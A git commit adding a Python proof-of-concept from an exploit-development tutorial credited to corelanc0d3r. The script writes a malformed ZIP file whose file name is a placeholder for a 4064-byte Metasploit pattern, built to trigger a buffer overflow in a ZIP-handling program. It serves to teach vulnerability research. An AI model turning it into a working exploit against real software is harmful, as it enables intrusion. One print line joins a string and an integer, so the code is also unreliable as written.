7b13a9a54acfafd638fa22cc1af7b8b2e4daea80
Kevin Kirsche <kev.kirsche@gmail.com>
2018-10-08 10:13:03 -0400

    Create 01-poc.py

---
+++ tutorial/01-poc.py
@@ -0,0 +1,49 @@
+#!/usr/bin/env python
+
+# Original Author : corelanc0d3r
+# Python POC Author: d3c3pt10n
+# http://www.corelan.be:8800
+#
+# Original: March 2010
+# Updated: October 2018
+
+from os import remove
+
+
+filename = "corelanboom.zip"
+
+ldf_header = (
+    "\x50\x4B\x03\x04\x14\x00\x00"
+    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
+    "\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\xe4\x0f"  # file size
+    "\x00\x00\x00"
+)
+
+cdf_header = (
+    "\x50\x4B\x01\x02\x14\x00\x14"
+    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\xe4\x0f"  # file size
+    "\x00\x00\x00\x00\x00\x00\x01\x00"
+    "\x24\x00\x00\x00\x00\x00\x00\x00"
+)
+
+eofcdf_header = (
+    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
+    "\x12\x10\x00\x00"  # Size of central directory (bytes)
+    "\x02\x10\x00\x00"  # Offset of start of central directory,
+    # relative to start of archive
+    "\x00\x00"
+)
+
+payload = "paste your 4064 byte metasploit pattern here"
+payload = payload + ".txt"
+
+print("Size : " + len(payload) + "\n")
+print("Removing old {filename} file\n".format(filename=filename))
+remove(filename)
+print("Creating new {filename} file\n".format(filename=filename))
+with open(filename, "w") as f:
+    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
+    f.write(file_content)
